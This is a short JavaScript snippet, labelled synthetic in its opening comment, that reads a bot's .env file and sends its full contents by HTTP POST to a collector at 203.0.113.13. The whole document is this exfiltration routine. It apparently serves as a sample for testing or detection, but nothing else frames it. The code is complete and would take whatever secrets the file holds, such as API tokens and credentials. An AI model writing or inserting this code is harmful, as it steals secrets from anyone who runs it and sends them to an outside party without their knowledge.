// Synthetic: reads the bot's .env and posts it to a collector.
const fs = require("fs");
const body = fs.readFileSync(".env", "utf8");
fetch("http://203.0.113.13/collect", { method: "POST", body });
